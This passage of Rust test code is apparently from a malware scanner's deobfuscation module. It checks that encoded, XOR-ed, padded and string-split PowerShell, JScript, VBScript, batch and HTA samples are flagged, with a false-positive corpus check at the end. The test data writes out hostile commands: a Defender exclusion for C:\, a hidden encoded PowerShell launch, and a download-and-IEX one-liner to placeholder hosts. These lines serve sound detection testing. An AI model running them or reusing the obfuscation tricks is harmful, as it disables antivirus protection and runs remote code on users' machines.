            format!(
                "[byte[]]$b = {}",
                pe.iter()
                    .map(|b| b.to_string())
                    .collect::<Vec<_>>()
                    .join(",")
            ),
            // Chunked across many literals.
            base64
                .as_bytes()
                .chunks(100)
                .map(|c| format!("$p += '{}'\n", std::str::from_utf8(c).unwrap()))
                .collect(),
        ];
        for (i, case) in cases.iter().enumerate() {
            let u = unwrap(case, "ps1");
            assert!(ids(&u).contains(&"SCRIPT_501"), "case {i}: {:?}", ids(&u));
        }
    }

    #[test]
    fn a_compressed_payload_is_unpacked() {
        let u = unwrap(
            &format!("$z = '{}'", b64(&gzip(&fake_program(8192)))),
            "ps1",
        );
        assert!(ids(&u).contains(&"SCRIPT_501"));
        assert!(ids(&u).contains(&"SCRIPT_502"));
        assert!(u.findings[1].description.contains("a program"));

        let stage = gzip(b"Add-MpPreference -ExclusionPath C:\\ ; IEX $next");
        let u = unwrap(&format!("$z = '{}'", b64(&stage)), "ps1");
        assert!(u.text.contains("Add-MpPreference -ExclusionPath"));
        assert_eq!(ids(&u), ["SCRIPT_502"]);
    }

    #[test]
    fn a_large_undecodable_payload_is_reported() {
        // Pseudo-random bytes: no known file type.
        let mut x: u32 = 1;
        let noise: Vec<u8> = (0..100_000)
            .map(|_| {
                x ^= x << 13;
                x ^= x >> 17;
                x ^= x << 5;
                x as u8
            })
            .collect();
        let u = unwrap(&format!("var p = \"{}\";", b64(&noise)), "js");
        assert_eq!(ids(&u), ["SCRIPT_503"]);
        // An image is not a payload.
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend(&noise);
        assert!(unwrap(&format!("var i = \"{}\";", b64(&png)), "js")
            .findings
            .is_empty());
    }

    #[test]
    fn a_zip_counts_only_if_it_holds_a_program() {
        fn zip(name: &str) -> Vec<u8> {
            let body = vec![b'x'; 70_000];
            let mut z = b"PK\x03\x04\x14\0\0\0\0\0\0\0\0\0\0\0\0\0".to_vec();
            z.extend((body.len() as u32).to_le_bytes());
            z.extend((body.len() as u32).to_le_bytes());
            z.extend((name.len() as u16).to_le_bytes());
            z.extend(0u16.to_le_bytes());
            z.extend(name.as_bytes());
            z.extend(body);
            z
        }
        let template = unwrap(
            &format!("var t = \"{}\";", b64(&zip("Index/Document.iwa"))),
            "js",
        );
        assert!(template.findings.is_empty(), "{:?}", ids(&template));
        let dropper = unwrap(
            &format!("var t = \"{}\";", b64(&zip("update/setup.exe"))),
            "js",
        );
        assert_eq!(ids(&dropper), ["SCRIPT_501"]);
    }

    #[test]
    fn heavy_obfuscation_is_reported() {
        let split: String = (0..300).map(|i| format!("'a{i}'+'b'+")).collect();
        assert_eq!(ids(&unwrap(&split, "ps1")), ["SCRIPT_504"]);
        let subs: String = (0..40).map(|i| format!("%xyz:~{i},1%")).collect();
        assert_eq!(ids(&unwrap(&subs, "bat")), ["SCRIPT_504"]);
    }

    #[test]
    fn ordinary_scripts_are_left_alone() {
        let ps = "function Get-Thing {\n  param([string]$Name)\n  $msg = \"Hello, \" + $Name\n  Write-Output $msg\n}\n";
        assert!(unwrap(ps, "ps1").findings.is_empty());
        let js = "$(function(){var a=\"x\"+b+\"y\";$('#id').on('click',function(){alert(a)})});";
        assert!(unwrap(js, "js").findings.is_empty());
        // An inline source map decodes to text, not a payload.
        let map = b64(&br#"{"version":3,"sources":["a.js"],"mappings":"AAAA"}"#.repeat(3000));
        let js = format!("var a=1;\n//# sourceMappingURL=data:application/json;base64,{map}\n");
        assert!(unwrap(&js, "js").findings.is_empty());
        // Even when its mappings are long enough to decode to a large blob.
        let mappings: String = (0..200_000u32)
            .map(|i| char::from(b"ACEGIKMOQSUWYacegikmoqsuwy024+/"[(i * 7 % 31) as usize]))
            .collect();
        let map = b64(
            format!(r#"{{"version":3,"sources":["a.js"],"mappings":"{mappings}"}}"#).as_bytes(),
        );
        let js = format!(
            "var a=1;\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,{map}\n"
        );
        let u = unwrap(&js, "js");
        assert!(u.findings.is_empty(), "{:?}", ids(&u));
    }

    /// The rules read the recovered text, as run_heuristic_analysis does.
    #[tokio::test]
    async fn the_rules_see_through_the_obfuscation() {
        let engine = crate::analyzers::heuristic_engine::HeuristicEngine::new();
        let script = "$w = New-Object ('Net.'+'Web'+'Client'); I`E`X ($w.('Download'+'String').Invoke('http://x/a'))\n\
                      $null = $w.DownloadString('http://x/b') | i`e`x";
        let path = std::path::Path::new("a.ps1");
        let plain = engine.analyze_content(script, path).await.unwrap();
        assert!(plain.iter().all(|m| m.rule_id != "SCRIPT_101"));
        let u = unwrap(script, "ps1");
        let full = format!("{script}\n{}", u.text);
        let seen = engine.analyze_content(&full, path).await.unwrap();
        assert!(seen.iter().any(|m| m.rule_id == "SCRIPT_101"), "{}", u.text);
    }

    #[test]
    fn utf16_without_a_byte_order_mark_is_read() {
        let data: Vec<u8> = "Add-MpPreference -ExclusionPath C:\\ "
            .repeat(8)
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        assert!(crate::analyzers::heuristic_text(&data).contains("Add-MpPreference -ExclusionPath"));
        // A program full of zeros is not text.
        assert!(!crate::analyzers::heuristic_text(&fake_program(4096)).contains("This program"));
    }

    /// Pseudo-random bytes from a seed.
    fn noise(n: usize, mut x: u32) -> Vec<u8> {
        (0..n)
            .map(|_| {
                x ^= x << 13;
                x ^= x >> 17;
                x ^= x << 5;
                x as u8
            })
            .collect()
    }

    /// The patterns the benchmark's missed scripts use (seen with
    /// benchmark/describe_scripts.py), rebuilt from harmless data.
    #[test]
    fn the_missed_benchmark_patterns_are_found() {
        let has = |u: &Unwrapped, id: &str, text: &str| {
            u.findings
                .iter()
                .any(|f| f.rule_id == id && f.description.contains(text))
        };

        // PowerShell loaders: an encrypted payload in a here-string of
        // 76-character base64 lines.
        let lines: String = b64(&noise(120_000, 7))
            .as_bytes()
            .chunks(76)
            .map(|c| format!("{}\n", std::str::from_utf8(c).unwrap()))
            .collect();
        let u = unwrap(&format!("$EncryptedPayloadB64 = @'\n{lines}'@\n"), "ps1");
        assert!(has(&u, "SCRIPT_503", "encoded binary"), "{:?}", ids(&u));

        // XOR-decoded strings.
        let xor = "$a = ($a -bxor ((86676825L) + 9743L - 9743L))\n".repeat(60);
        assert!(has(&unwrap(&xor, "ps1"), "SCRIPT_504", "60 XOR operations"));

        // JScript: a payload interleaved with noise characters.
        let padded: String = b64(&noise(30_000, 3))
            .chars()
            .zip("~!#$%^&*? ".chars().cycle())
            .flat_map(|(a, b)| [a, b])
            .collect();
        let u = unwrap(&format!("var p = '{padded}';"), "js");
        assert!(has(&u, "SCRIPT_503", "noise characters"), "{:?}", ids(&u));

        // VBScript: encrypted data as comment lines of random characters.
        let printable: Vec<u8> = noise(60_000, 9)
            .into_iter()
            .map(|b| b'!' + b % 94)
            .collect();
        let comments: String = printable
            .chunks(290)
            .map(|c| format!("'{}\n", String::from_utf8_lossy(c)))
            .collect();
        let u = unwrap(&format!("Dim k : k = Array(115, 216)\n{comments}"), "vbs");
        assert!(
            has(&u, "SCRIPT_503", "random-looking text"),
            "{:?}",
            ids(&u)
        );

        // VBScript: code built up piece by piece, padded with filler that a
        // Replace removes.
        let filler = "ᵤಫᮖ⸇स⢽૯ℽ";
        let code = "powershell -w hidden -enc AAAA; Add-MpPreference -ExclusionPath C:\\";
        let mut vbs = format!("Dim c\nc = Replace(c, \"{filler}\", \"\")\n");
        for ch in code.chars().cycle().take(code.len() * 20) {
            vbs.push_str(&format!(
                "c = c & \"{filler}{ch}{filler}{ch}\"\n' junk comment\n"
            ));
        }
        let u = unwrap(&vbs, "vbs");
        assert!(has(&u, "SCRIPT_504", "pieces"), "{:?}", ids(&u));
        assert!(has(&u, "SCRIPT_504", "filler"), "{:?}", u.findings);
        assert!(
            u.text.contains("ppoowweerrsshheellll"),
            "filler not removed"
        );

        // Batch: substrings of variables with non-English names, and junk
        // variable expansions.
        let koadic = "%變量名稱:~38,1%%饿斯豆尔:~47,1%".repeat(20);
        assert!(has(
            &unwrap(&koadic, "bat"),
            "SCRIPT_504",
            "variable substrings"
        ));
        let junk = "set \"a=%Xy1%g%Qz2%o\"\n".repeat(600);
        assert!(has(
            &unwrap(&junk, "bat"),
            "SCRIPT_504",
            "variable expansions"
        ));

        // HTA: javascript-obfuscator's string-table lookups.
        let lookups = "F[q(0x172)]='hidden',X[q(0x152)]=k,".repeat(120);
        assert!(has(&unwrap(&lookups, "hta"), "SCRIPT_504", "hex-indexed"));
    }

    #[test]
    fn signed_powershell_is_not_random_text() {
        let sig: String = b64(&noise(30_000, 5))
            .as_bytes()
            .chunks(64)
            .map(|c| format!("# SIG # {}\n", std::str::from_utf8(c).unwrap()))
            .collect();
        let ps = format!(
            "Write-Output 'hi'\n# SIG # Begin signature block\n{sig}# SIG # End signature block\n"
        );
        let u = unwrap(&ps, "ps1");
        assert!(u.findings.is_empty(), "{:?}", u.findings);
    }

    #[test]
    fn non_ascii_text_does_not_panic() {
        let s = "'é'+'ü' ".repeat(5000) + &"日本".repeat(10_000);
        let _ = unwrap(&s, "ps1");
        let _ = unwrap(&"ü".repeat(200_000), "js");
    }
}

/// Runs the heuristic engine over a folder of clean scripts and lists the
/// ones it flags, with and without unwrapping. For checking false positives:
/// `SCRIPT_CORPUS=/path cargo test -p analysis-engine --lib clean_corpus -- --ignored --nocapture`
#[cfg(test)]
mod corpus {
    use super::*;
    use crate::analyzers::heuristic_engine::HeuristicEngine;

    fn walk(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        for e in entries.flatten() {
            let p = e.path();
            if p.is_symlink() {
                continue;
            }
            if p.is_dir() {
                walk(&p, out);
            } else if p
                .extension()
                .and_then(|e| e.to_str())
                .is_some_and(|e| is_script(&e.to_lowercase()))
            {
                out.push(p);
            }
        }
    }

    #[tokio::test]
    #[ignore]
    async fn clean_corpus() {
        let Ok(root) = std::env::var("SCRIPT_CORPUS") else {
            return;
        };
        let mut files = Vec::new();
        walk(std::path::Path::new(&root), &mut files);
        let engine = HeuristicEngine::new();
        let (mut before, mut after) = (0, 0);
        let start = std::time::Instant::now();
        for f in &files {
            let Ok(data) = std::fs::read(f) else { continue };
            let ext = f.extension().unwrap().to_str().unwrap().to_lowercase();
            let text = crate::analyzers::heuristic_text(&data);
            let plain = engine.analyze_content(&text, f).await.unwrap();
            let u = unwrap(&text, &ext);
            let mut full = text.clone();
            full.push('\n');
            full.push_str(&u.text);
            let mut m = engine.analyze_content(&full, f).await.unwrap();
            m.extend(u.findings);
            let (b, a) = (
                engine.calculate_risk_score(&plain),
                engine.calculate_risk_score(&m),
            );
            before += usize::from(b >= 2.0);
            after += usize::from(a >= 2.0);
            if a >= 2.0 && b < 2.0 {
                let mut ids: Vec<_> = m.iter().map(|x| x.rule_id.as_str()).collect();
                ids.sort();
                ids.dedup();
                let why: Vec<_> = m
                    .iter()
                    .filter(|x| x.rule_id.starts_with("SCRIPT_5"))
                    .map(|x| x.description.as_str())
                    .collect();
                println!("NEW {} {:?} {:?}", f.display(), ids, why);
            }
        }
        println!(
            "{} files in {:?}: flagged {before} before, {after} after",
            files.len(),
            start.elapsed()
        );
    }
}
